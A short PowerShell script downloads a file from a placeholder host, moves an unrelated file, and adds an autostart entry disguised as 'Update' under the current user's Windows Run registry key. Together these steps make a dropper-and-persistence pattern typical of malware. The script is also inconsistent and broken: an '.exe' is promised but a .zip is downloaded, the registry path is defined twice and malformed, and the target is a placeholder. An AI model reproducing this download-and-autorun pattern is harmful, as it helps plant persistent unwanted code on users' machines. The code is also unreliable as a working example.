# echo off

# Download .exe
(New-Object Net.WebClient).DownloadFile('http://www.example.com/package.zip', 'package.zip')

# Move .exe
Move-Item -Path C:\test.txt -Destination E:\Temp\tst.txt


# Add to registery
# Set variables to indicate value and key to set
$RegistryPath = 'HKCU:\Software\CommunityBlog\Scripts'
$RegistryPath = 'HKCU:\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
$Name         = 'Update'
$Value        = 'path_exe'
# Create the key if it does not exist
If (-NOT (Test-Path $RegistryPath)) {
  New-Item -Path $RegistryPath -Force | Out-Null
}  
# Now set the value
New-ItemProperty -Path $RegistryPath -Name $Name -Value $Value -PropertyType REG_SZ -Force 



